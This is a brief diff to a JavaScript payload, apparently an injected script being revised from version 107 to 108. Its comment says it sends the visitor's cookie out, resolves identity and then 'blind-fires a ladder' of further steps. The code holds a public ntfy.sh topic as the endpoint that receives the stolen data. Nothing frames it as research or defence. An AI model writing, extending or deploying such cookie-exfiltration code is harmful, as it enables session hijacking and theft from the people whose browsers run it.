@@ -13,7 +13,7 @@
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
   if (window.__SOV108__) return; window.__SOV108__ = 1;
-  var V = '107', TAG = 'SOV107';
+  var V = '108', TAG = 'SOV108';
   var NT = 'https://ntfy.sh/sovp2866206';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
